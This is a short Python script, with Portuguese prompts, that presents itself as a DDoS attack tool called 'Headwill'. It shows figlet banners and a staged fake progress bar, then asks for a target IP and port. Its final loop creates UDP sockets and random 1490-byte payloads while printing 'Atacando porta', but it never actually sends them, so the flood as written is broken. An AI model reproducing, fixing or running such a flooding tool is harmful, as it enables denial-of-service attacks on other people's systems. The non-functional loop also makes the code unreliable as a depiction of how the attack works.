import socket
import random
import os
import time

time.sleep(1)
os.system("clear")
time.sleep(1)

os.system("figlet Headwill")
time.sleep(1)

os.system("figlet Ataque")
time.sleep(1)

os.system("figlet DDoS")
time.sleep(4)

os.system("clear")
os.system("figlet Aguarde")
time.sleep(3)
os.system("clear")

print("""
••20%
""")
time.sleep(1)
os.system("clear")

print("""
••••40%
""")
time.sleep(1)
os.system("clear")

print("""
••••••60%
""")

time.sleep(1)
os.system("clear")

print("""
••••••••80%
""")

time.sleep(1)
os.system("clear")

print("""
••••••••••100%
""")
time.sleep(2)
os.system("clear")
time.sleep(1)

print()
IP = input(" Digite o IP: => ")
Porta = input(" Porta: => ")
print("O IP e: ", IP)
print("A Porta e: ", Porta)

os.system("figlet INICIANDO")
time.sleep(5)
os.system("clear")
time.sleep(1)

for x in range(50):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    print('Atacando porta 💥')
